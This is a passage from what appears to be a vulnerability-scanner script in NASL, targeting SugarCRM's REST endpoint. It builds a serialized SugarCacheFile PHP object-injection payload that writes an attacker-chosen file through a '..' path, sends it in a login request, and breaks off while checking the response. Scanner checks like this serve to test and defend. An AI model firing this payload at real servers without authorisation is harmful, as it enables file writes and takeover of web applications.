...
func do_ex( dir, file, ex, port ){
	f_len = strlen( file ) + 2;
	ex_len = strlen( ex );
	if(dir == "/"){
		dir = "";
	}
	payload_serialized = "O%3A%2B14%3A%22SugarCacheFile%22%3A23%3A%7BS%3A17%3A%22%5C00*%5C00_cacheFileName%22%3Bs%3A" + f_len + "%3A%22" + ".." + urlencode( str: file ) + "%22%3BS%3A16%3A%22%5C00*%5C00_cacheChanged%22%3Bb%3A1%3BS%3A14%3A%22%5C00*%5C00_localStore%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A19%3A%22" + urlencode( str: ex ) + "%22%3B%7D%7D";
	data = "method=login&input_type=Serialize&rest_data=" + payload_serialized;
	req = http_post_put_req( port: port, url: dir + "/service/v4/rest.php", data: data, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(buf && IsMatchRegexp( buf, "HTTP/1\\.. 200" )){
